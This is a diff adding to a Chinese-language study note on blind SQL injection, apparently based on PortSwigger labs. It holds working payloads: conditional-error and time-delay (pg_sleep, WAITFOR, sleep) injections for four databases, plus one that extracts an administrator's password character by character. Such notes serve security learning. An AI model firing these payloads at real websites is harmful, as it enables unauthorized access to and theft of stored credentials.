@@ -96,7 +96,53 @@ xyz' AND (SELECT CASE WHEN (LENGTH(password)>1) THEN 1/0 ELSE 'a' END FROM users
 ```
 xyz' AND (SELECT CASE WHEN (SUBSTRING(password, 1, 1)='a') THEN 1/0 ELSE 'a' END FROM users WHERE username='administrator')='a
 ```
+#### cheat-sheet
+* Oracle
+```
+SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual
+```
+* Microsoft
+```
+SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
+```
+* PostgreSQL
+```
+SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END
+```
+* MySQL
+```
+SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')
+```
 ### 觸發時間延遲
+#### 情境
+* 這次的情境是，我們進行觸發 SQL 錯誤，但結果沒有什麼變化，開發人員有處理錯誤訊息。因此我們透過觸發時間延遲，注入成功的話，網站將會根據我們設定的延遲時間來延遲回應，來辨別注入的結果是 True 或 False。
+#### 作法
+* 透過 `SELECT CASE WHEN (條件)`，來決定是否觸發延遲 (`pg_sleep(10)`) ，來觸發回應時間延遲，進一步得知注入的結果是 True 或 False。
+```
+xyz'%3b SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
+```
+#### 取得密碼
+* 與之前做法相同，修改 `SUBSTRING(password, 1, 1)='a'`，將密碼一個一個字拚湊出來。
+```
+xyz'%3b SELECT CASE WHEN ((SELECT COUNT(username) FROM users WHERE username = 'administrator' AND SUBSTRING(password, 1, 1)='a')=1) THEN pg_sleep(10) ELSE pg_sleep(0) END
+```
+#### cheat-sheet
+* Oracle
+```
+SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
+```
+* Microsoft
+```
+IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
+```
+* PostgreSQL
+```
+SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
+```
+* MySQL
+```
+SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')
+```
 ### out-of-band (OAST) 技術
 ## 參考資料
 * [portswigger sqli cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
